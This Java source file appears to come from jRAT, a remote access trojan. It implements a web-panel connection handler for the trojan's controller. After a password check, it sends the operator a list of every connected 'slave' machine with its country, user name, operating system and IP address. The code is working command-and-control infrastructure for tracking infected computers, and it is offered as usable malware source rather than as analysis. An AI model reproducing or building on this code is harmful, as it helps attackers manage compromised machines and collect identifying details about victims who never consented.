package se.jrat.client.webpanel;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;

public class WebPanelConnection implements Runnable {

	private WebPanelListener parent;
	private Socket socket;
	private BufferedReader br;
	private BufferedWriter bw;

	public WebPanelConnection(WebPanelListener parent, Socket socket) throws Exception {
		this.parent = parent;
		this.socket = socket;
		this.br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		this.bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
	}

	@Override
	public void run() {
		try {
			String pass = readLine();

            if (!pass.equals(parent.getHashedPassword())) {
                throw new Exception("Failed to auth, got password " + pass);
            }

            int packet;
            while ((packet = readNumber()) != -1) {
            	if (packet == WebPanelPackets.PACKET_LIST) {
                	StringBuilder sb = new StringBuilder();
                	
                	for (AbstractSlave slave : Main.connections) {
                		sb.append(slave.getCountry() + ":" + slave.formatUserString() + ":" + slave.getOperatingSystem() + ":" + slave.getIP());
                		sb.append(";");
                	}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                }
            }

			socket.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public String readLine() throws Exception {
		return br.readLine().trim();
	}

	public int readNumber() throws Exception {
		return Integer.parseInt(readLine());
	}
}
